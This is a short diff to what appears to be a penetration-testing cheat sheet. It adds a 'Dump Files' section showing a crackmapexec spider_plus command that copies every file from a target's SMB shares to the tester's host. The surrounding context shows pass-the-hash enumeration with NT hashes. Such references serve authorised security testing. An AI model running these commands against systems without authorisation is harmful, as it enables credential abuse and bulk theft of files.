@@ -927,3 +927,11 @@ crackmapexec smb CIDR/IP -d targetdomain.tld -u username -H lm-hash:nt-hash \
 --local-groups \
 --pass-pol
 ```
+
+#### Dump Files:
+
+Using the option `-o READ_ONLY=false` all files will be copied on the host
+
+```
+crackmapexec smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o READ_ONLY=false
+```
